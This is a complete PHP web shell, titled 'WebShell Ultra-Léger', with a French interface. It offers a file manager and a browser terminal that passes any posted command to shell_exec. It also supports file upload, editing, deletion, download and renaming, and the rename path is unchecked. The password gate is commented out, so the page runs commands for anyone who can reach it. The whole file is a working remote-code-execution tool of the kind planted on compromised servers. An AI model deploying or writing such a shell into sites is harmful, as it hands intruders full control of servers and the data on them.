<?php
// =============== CONFIGURATION ===============
session_start();
/*
$PASSWORD = "admin123";
if (!isset($_SESSION['auth']) || $_SESSION['auth'] !== true) {
    if (isset($_POST['pass']) && $_POST['pass'] === $PASSWORD) {
        $_SESSION['auth'] = true;
    } else {
        die('<title>Login</title><body style="background:#000;color:#0f0;font-family:Arial;text-align:center;padding-top:15%">
             <h2>Accès restreint</h2>
             <form method="post"><input type="password" name="pass" autofocus style="padding:10px;font-size:18px">
             <button type="submit" style="padding:10px 20px;font-size:18px">Entrer</button></form></body>');
    }
}
*/
// if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }

// =============== FONCTIONS ===============
function h($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
function rrmdir($dir) {
    if (!file_exists($dir)) return;
    if (!is_dir($dir)) { unlink($dir); return; }
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') continue;
        rrmdir($dir . DIRECTORY_SEPARATOR . $item);
    }
    rmdir($dir);
}

// =============== RÉPERTOIRE SÉCURISÉ ===============
$root = realpath(dirname(__FILE__));
$dir  = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;
if ($dir === false || strpos($dir, $root) !== 0) $dir = $root;

// =============== REQUÊTES AJAX ===============
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');
    $out = array('success' => false);

    if (isset($_FILES['upload']) && is_array($_FILES['upload']['name'])) {
        $count = 0;
        for ($i = 0; $i < count($_FILES['upload']['name']); $i++) {
            if ($_FILES['upload']['error'][$i] === 0) {
                $dest = $dir . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name'][$i]);
                if (move_uploaded_file($_FILES['upload']['tmp_name'][$i], $dest)) $count++;
            }
        }
        $out = array('success' => true, 'msg' => "$count fichier(s) uploadé(s)");
    }
    elseif (isset($_POST['cmd'])) {
        $cmd = trim($_POST['cmd']);
        $output = $cmd !== '' ? shell_exec($cmd . ' 2>&1') : '';
        $out = array('success' => true, 'output' => $output !== null ? $output : '');
    }
    elseif (isset($_POST['savefile'])) {
        $path = $_POST['path'];
        $full = realpath($path);
        if ($full && strpos($full, $root) === 0) {
            file_put_contents($full, $_POST['content']);
            $out = array('success' => true, 'msg' => 'Sauvegardé');
        }
    }

    echo json_encode($out);
    exit;
}

// =============== ACTIONS GET ===============
if (isset($_GET['action'])) {
    $f = isset($_GET['f']) ? $_GET['f'] : '';
    $full = realpath($f);
    if ($full && strpos($full, $root) === 0) {
        switch ($_GET['action']) {
            case 'download':
                if (file_exists($full)) {
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="'.basename($full).'"');
                    readfile($full);
                    exit;
                }
                break;
            case 'delete':
                is_dir($full) ? rrmdir($full) : unlink($full);
                header('Location: ?dir='.urlencode(dirname($full)));
                exit;
            case 'rename':
                $new = isset($_GET['new']) ? $_GET['new'] : '';
                if ($new) rename($full, $new);
                header('Location: ?dir='.urlencode(dirname($full)));
                exit;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<title>WebShell Ultra-Léger</title>
<style>
    body{font-family:Arial,sans-serif;background:#1e1e1e;color:#0f0;margin:0;padding:15px;}
    a{color:#0f0;text-decoration:underline;}
    input,button,textarea{background:#000;color:#0f0;border:1px solid #0f0;padding:8px;margin:5px;font-family:Courier New;}
    button{cursor:pointer;}
    table{width:100%;border-collapse:collapse;margin:10px 0;}
    td,th{border:1px solid #0f0;padding:8px;}
    th{background:#003300;}
    tr:hover{background:#002200;}
    .dir{color:#0f0;font-weight:bold;}
    .file{color:#0f8;}
    .drop{border:2px dashed #0f0;padding:30px;text-align:center;margin:20px 0;cursor:pointer;}
    .drop.drag{background:#003300;}
    #term{background:#000;height:300px;overflow:auto;padding:10px;font-family:Courier New;margin:10px 0;}
    textarea{width:100%;height:400px;background:#000;color:#0f0;border:1px solid #0f0;font-family:Courier New;}
    .btn{padding:10px 20px;background:#003300;border:none;color:#0f0;cursor:pointer;}
</style>
</head>
<body>

<h1>File Manager + Terminal</h1>
<!--<div style="float:right"><a href="?logout=1">Déconnexion</a></div>-->

<div style="background:#002200;padding:10px;border:1px solid #0f0;margin-bottom:15px;">
<?php
$rel = substr($dir, strlen($root));
$parts = $rel ? explode(DIRECTORY_SEPARATOR, trim($rel, DIRECTORY_SEPARATOR)) : array();
$path = $root;
echo '<a href="?">/</a>';
foreach ($parts as $part) {
    if ($part === '') continue;
    $path .= DIRECTORY_SEPARATOR . $part;
    echo ' / <a href="?dir='.urlencode($path).'">'.$part.'</a>';
}
?>
</div>

<div class="drop" id="dropzone">Glissez-déposez ou cliquez pour uploader
<form id="upform" enctype="multipart/form-data" style="display:none">
<input type="file" name="upload[]" id="upload" multiple>
</form>
</div>

<table>
<tr><th>Nom</th><th>Taille</th><th>Date</th><th>Actions</th></tr>
<?php if ($dir != $root): ?>
<tr><td colspan="4"><a href="?dir=<?=urlencode(dirname($dir))?>">.. (parent)</a></td></tr>
<?php endif; ?>
<?php
foreach (scandir($dir) as $item):
    if ($item == '.' || $item == '..') continue;
    $fp = $dir . DIRECTORY_SEPARATOR . $item;
    $isdir = is_dir($fp);
?>
<tr>
    <td>
        <?php if ($isdir): ?>
            <span class="dir">[DIR]</span> <a href="?dir=<?=urlencode($fp)?>"><?=h($item)?></a>
        <?php else: ?>
            <span class="file">[FILE]</span> <a href="?open=<?=urlencode($fp)?>"><?=h($item)?></a>
        <?php endif; ?>
    </td>
    <td><?= $isdir ? '--' : number_format(filesize($fp)) ?> octets</td>
    <td><?= date('d/m/Y H:i', filemtime($fp)) ?></td>
    <td>
        <?php if (!$isdir): ?><a href="?action=download&f=<?=urlencode($fp)?>">DL</a> <?php endif; ?>
        <a href="?action=delete&f=<?=urlencode($fp)?>" onclick="return confirm('Supprimer ?')">Suppr</a>
        <a href="#" onclick="var n=prompt('Nouveau nom','<?=h($item)?>');if(n)location='?action=rename&f=<?=urlencode($fp)?>&new=<?=urlencode(dirname($fp).DIRECTORY_SEPARATOR)?>'+encodeURIComponent(n);return false;">Renommer</a>
    </td>
</tr>
<?php endforeach; ?>
</table>

<?php if (isset($_GET['open'])):
    $file = $_GET['open'];
    $fullpath = realpath($file);
    if ($fullpath && strpos($fullpath, $root) === 0 && is_file($fullpath) && filesize($fullpath) < 5000000):
?>
<h2>Édition : <?=h(basename($file))?></h2>
<textarea id="code"><?=h(file_get_contents($fullpath))?></textarea><br>
<button class="btn" onclick="saveFile()">Enregistrer</button>
<input type="hidden" id="filepath" value="<?=h($fullpath)?>">
<?php endif; endif; ?>

<h2>Terminal</h2>
<div id="term"><pre>$ </pre></div>
<form onsubmit="runCmd(this.cmd.value);this.cmd.value='';return false;">
<input type="text" name="cmd" placeholder="ls, pwd, whoami, cat fichier..." style="width:80%">
<button type="submit">Go</button>
</form>

<script>
// Upload
document.getElementById('dropzone').onclick = function(){document.getElementById('upload').click();};
document.getElementById('upload').onchange = function(){document.getElementById('upform').submit();};

var dz = document.getElementById('dropzone');
['dragover','dragenter'].forEach(function(e){dz.addEventListener(e,function(ev){ev.preventDefault();dz.classList.add('drag');});});
['dragleave','drop'].forEach(function(e){dz.addEventListener(e,function(ev){ev.preventDefault();dz.classList.remove('drag');});});
dz.addEventListener('drop', function(e){
    e.preventDefault(); dz.classList.remove('drag');
    var files = e.dataTransfer.files;
    if(files.length==0) return;
    var form = new FormData();
    for(var i=0;i<files.length;i++) form.append('upload[]', files[i]);
    var xhr = new XMLHttpRequest();
    xhr.open('POST',''); xhr.onload = function(){location.reload();}; xhr.send(form);
});

function saveFile(){
    var xhr = new XMLHttpRequest();
    xhr.open('POST','');
    xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
    xhr.onload = function(){alert('Sauvegardé');};
    xhr.send('savefile=1&path='+encodeURIComponent(document.getElementById('filepath').value)+'&content='+encodeURIComponent(document.getElementById('code').value));
}

function runCmd(cmd){
    if(!cmd.trim()) return;
    var term = document.querySelector('#term pre');
    term.innerHTML += '$ '+cmd+'\n';
    var xhr = new XMLHttpRequest();
    xhr.open('POST','');
    xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
    xhr.onload = function(){
        if(xhr.status==200){
            try { var r = JSON.parse(xhr.responseText); term.innerHTML += (r.output||'')+'\n'; }
            catch(e){ term.innerHTML += xhr.responseText+'\n'; }
            term.scrollTop = term.scrollHeight;
        }
    };
    xhr.send('cmd='+encodeURIComponent(cmd));
}
</script>
</body>
</html>
